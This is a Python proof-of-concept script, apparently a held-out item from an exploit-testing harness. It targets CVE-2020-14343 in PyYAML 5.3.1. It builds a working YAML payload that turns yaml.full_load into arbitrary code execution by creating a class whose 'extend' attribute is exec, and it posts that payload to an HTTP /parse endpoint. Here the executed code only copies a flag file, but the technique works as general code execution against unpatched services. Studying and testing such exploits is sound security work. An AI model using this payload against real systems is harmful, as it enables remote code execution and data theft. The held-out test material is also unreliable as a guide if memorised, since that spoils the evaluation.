#!/usr/bin/env python3
"""[HELD-OUT] CVE-2020-14343 residual for codeinj_pyyaml_fullloader (external HTTP).

CVE-2020-1747 was fixed in PyYAML 5.3.1 by a NARROW guard: set_python_instance_state
runs check_state_key and refuses `state:` keys matching '^extend$' or '^__.*__$'. That
fix only inspects the object's STATE -- it does NOT remove the underlying
`python/object/new` object-instantiation escape, and it never inspects the class
CONSTRUCTION arguments. NVD (verbatim): "A flaw was discovered ... more complete than
CVE-2020-1747 ... This flaw exists because of an incomplete fix for CVE-2020-1747."

The residual defeats the 5.3.1 blacklist by moving the poisoned `extend` OUT of `state:`
and INTO the class-creation call, combining python/object/new with a tuple + map,
delivered over the SAME real HTTP POST /parse (yaml.full_load(request.data)):

    !!python/object/new:type
    args:
    - z                                    # class name
    - !!python/tuple []                    # bases  (the tuple half of the combo)
    - extend: !!python/name:builtins.exec  # namespace map -> class attr `extend`
    listitems: "<benign flag-copy code>"

`type("z", (), {"extend": exec})` builds a class whose `extend` IS exec; the state
blacklist is never consulted because nothing is set via `state:`. Then
construct_python_object_apply calls `z.extend(listitems)` == `exec(<code>)`, which copies
the planted /flag canary into /out/leak.txt (the SAME benign local read+copy as the seed
-- no shell, no subprocess, no network). Flag in the /parse response == the FullLoader
object escape fired == 5.3.1 blacklist bypassed.

On V1 (PyYAML 5.3.1) this REACHES the flag (residual open). On V2 (PyYAML 5.4, the
CVE-2020-14343 fix, commit a001f27) python/module, python/object, python/object/new and
python/object/apply multi-constructors are MOVED from FullConstructor to
UnsafeConstructor, so yaml.full_load no longer has any constructor for the tag ->
ConstructorError "could not determine a constructor for the tag
'tag:yaml.org,2002:python/object/new:type'" at load (BLOCKED).
"""
import sys
from pathlib import Path

# Reach the case dir's poc_common (this file lives in _heldout/).
sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
from poc_common import post_parse  # noqa: E402

CODE = "open('/out/leak.txt','w').write(open('/flag').read())"

_PAYLOAD_TYPE = (
    "!!python/object/new:type\n"
    "args:\n"
    "- z\n"
    "- !!python/tuple []\n"
    "- extend: !!python/name:builtins.exec\n"
    'listitems: "%s"\n' % CODE
)

# Kept as a list so the oracle can iterate multiple residual vectors if desired.
VECTORS = ["type-tuple-map-classdict-extend"]


def candidate(vec="type-tuple-map-classdict-extend"):
    return {
        "id": "cve-2020-14343-fullloader-tuple-map-classdict-residual",
        "payload": _PAYLOAD_TYPE,
    }


def bypass_poc(*, version="v1"):
    """Send the CVE-2020-14343 residual YAML to `version` over external HTTP; return JSON response."""
    return post_parse(_PAYLOAD_TYPE, version)


if __name__ == "__main__":
    print(_PAYLOAD_TYPE)
